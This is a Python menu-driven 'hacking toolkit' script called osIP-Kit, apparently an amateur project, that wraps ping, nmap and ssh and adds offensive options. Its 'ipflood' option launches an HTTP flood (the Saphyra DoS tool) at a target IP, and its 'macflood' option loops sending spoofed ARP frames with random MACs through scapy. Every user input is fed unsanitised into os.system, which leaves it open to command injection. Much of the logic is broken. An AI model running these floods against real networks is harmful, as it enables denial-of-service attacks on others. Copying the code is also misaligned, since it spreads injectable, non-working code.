# IMPORTS
import os
import socket
import threading
import socket as s
import sys
import json
import urllib
from urllib.request import urlopen
import time
import requests
from scapy.all import *
from pyfiglet import figlet_format
from colorama import Fore, Style
# MENU
print (Style.BRIGHT + Fore.GREEN +"                 W E L - C O M E ")
time.sleep(0.5)
print ("""
       .---.
       |---|
       |---|
       |---|
   .---^ - ^---.
   : O S I P   :
   :___________:
      |  |//|
      |  |//|
      |  |//|
      |  |//|
      |  |//|
      |  |//|
      |  |.-|
      |.-'**|
       \***/
        \*/
         V

        '
         ^'
        (_)


~<-osIP-Kit V2.5->~
""")
time.sleep(0.5)
print ("==================================")
print ("Made By Ahmad")
print ("Replit: @AhmadTheWeirdo")
print ("YouTube: Black Magic") 
print ("==================================")
time.sleep(0.5)
# VARIABLES
choice = input("[*] ")
ping = ""
ipflood = ""
# COMMANDS
def ask():
  choice = input("[*] ")
if choice == "ping":
    ipp = input("[*] Enter The IP Address/Hostname That You Want To Ping: ")
    os.system("ping "+ipp)
    ask()
elif choice == "ipflood":
	print ("[*] Please Note: Due To Anonymous Making The Saphyra Tool Ages Ago Its Made In Python 2 So Python 2 Is Required!")
	ipdos = input("[*] Input Target's IP Address:  ")
	os.system("python2 saphyra.py "+ipdos)
elif choice == "nmap":
	nmapip = input("[*] Enter The IP You Want To Check: ")
	os.system("nmap "+nmapip)
	ask()
elif choice == "help":
	print ("""
	----------------------------------------------------------
	clear -- clears the screen
	ipflood -- spam http requests to an ip (5407 user agents)
	nmap -- nmap the ip and shows the open ports
	iplookup -- shows the info of the ip/your ip
	macflood -- floods the mac address with requests
	ncat -- makes a reverse shell script
	install -- installs all the requirements
	credits -- prints who made the script
	req -- installs python requirements
	ssh -- sshs into a ip address
	gen -- generates ip addresses and checks them
	geng -- generates grabify links and checks them
	checkug -- posts all the useragents
	compile -- compiles script into a exe file (make sure you have the tools folder with the exe file to run!!)
	exit -- exits the script
	---------------------------------------------------------
	""")
	ask()
elif choice == "checkug":
	os.system("clear")
	os.system("curl https://raw.githubusercontent.com/laorynas/Saphyra/master/lists/useragents.txt")
	ask()
elif choice == "exit":
	print ("[*] Thanks For Using osIP-Kit. <3")
	exit()
elif choice == "compile":
	os.system("pyinstaller --onefile main.py")
	ask()
elif choice == "gen":
	print ("Coming Soon...")
	ask()
elif choice == "geng":
	print ("Coming Soon...")
	ask()
elif choice == "ssh":
	print ("example: kali@192.168.0.0")
	ipssh = input("[*] Enter The SSH Client's Username: ")
	os.system("ssh "+ipssh)
	ask()
elif choice == "req":
	os.system("sudo pip3 install scapy pyfiglet colorama pyfiglet requests pyinstaller")
elif choice == "credits":
	print ("""
	Made By Ahmad
	Made For Educational Purposes Only/ Penetration Testing
	""")
	ask()
elif choice == "install":
	print ("[*] Installing...")
	done = False
	os.system("sudo apt-get nmap netcat python2")
	ask()
	ask()
	if done == True:
		print ("[*] Restarting Device...")
		os.system("sudo reboot")
		ask()
elif choice == "iplookup":
	os.system("bash tools/ii.sh")
	ask()
elif choice == "macflood":
    while 1:
    	sendp(Ether(src=RandMAC(),dst=input("[*] Enter The Target's Mac Address: ")/ARP(op=2, psrc="0.0.0.0", hwdst=input("[*] Enter Your Mac Address: "))/Padding(load="X"*18)))
    	ask()
elif choice == "ncat":
	iplisten = input("[*] Enter The IP Listener: ")
	os.system("nc -l "+iplisten)
	ask()
elif choice == "clear":
		os.system("clear")
		ask()
else:
	while choice==0:
		if choice==["clear","ncat","macflood","iplookup","install","gen","geng","credits","req","ssh","ipflood","exit","compile","checkug"]:
			break